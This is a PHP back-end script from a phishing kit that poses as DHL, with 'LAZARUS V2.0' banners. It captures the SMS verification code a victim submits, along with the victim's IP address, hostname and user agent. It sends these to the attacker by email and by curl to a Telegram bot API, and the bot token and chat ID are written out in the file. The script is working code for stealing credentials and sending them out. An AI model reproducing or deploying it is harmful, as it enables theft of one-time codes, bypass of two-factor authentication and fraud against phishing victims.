<?php 

$smscode=$_POST['smscode'];

include './email-dialk.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$msg  = "🔥🔥🔥🔥🔥 [ DHL V2.0 ] 🔥🔥🔥🔥🔥\n";
$msg.="📱 [SMS] : ".$_POST['smscode']."\n";

$msg .= "💎💎💎💎 [ 💻 SYSTEMS INFORMATION 💻 ] 💎💎💎💎"."\n";
$msg .= "# [date entry]  :" . date("Y-m-d - H:i:s - ")."\n";
$msg .= "#️ [Client IP]   : ".$ip."\n";
$msg .= "#️ [HostName]    : ".$hostname."\n";
$msg .= "#️ [User Agent]  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$msg .= "🔥🔥🔥🔥🔥 [ LAZARUS V2.0 ] 🔥🔥🔥🔥🔥\n";
$subject = "★ DHL ★ | 📱 " . "SMS:" . $_POST['smscode'] . " " . $ip;
$headers = "From:✡ AYOUBE ✡\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
mail($to,$subject,$headers,$msg);


$ipp=$_SERVER['REMOTE_ADDR'];

$txt="";
$txt.="========================================================="."\n";
$txt.="SMS CODE:".$smscode."\n";
$txt.="Ip :".$ipp."\n";





$website="https://api.telegram.org/bot1330353529:AAEmmLcVQRVDvo2pdHR2WUe4Ol-XDLHde8o";

$params=[
    'chat_id'=>'1377494472',
    'text'=>$msg,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);



echo json_encode($_POST);


 ?>
